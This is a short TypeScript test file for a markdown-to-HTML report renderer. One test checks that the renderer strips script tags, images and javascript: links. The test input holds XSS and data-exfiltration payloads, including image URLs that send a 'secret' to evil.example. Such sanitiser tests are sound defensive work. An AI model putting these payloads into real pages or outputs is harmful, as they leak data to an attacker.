import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

process.env.STATE_DIR = mkdtempSync(join(tmpdir(), "agent-"));
const { renderReport } = await import("../src/web.ts");

test("renders markdown", () => {
  const html = renderReport("## Likely cause\n\n`app/lib/x.ts:12` is **wrong**\n\n- one\n- two");
  assert.match(html, /<h2>Likely cause<\/h2>/);
  assert.match(html, /<code>app\/lib\/x.ts:12<\/code>/);
  assert.match(html, /<li>one<\/li>/);
});

test("never emits raw HTML or images", () => {
  const html = renderReport(
    '<script>alert(1)</script> <img src="https://evil.example/x?d=secret">\n\n![leak](https://evil.example/p?d=secret)\n\n[x](javascript:alert(1))',
  );
  assert.doesNotMatch(html, /<script|<img|href="javascript:/);
});
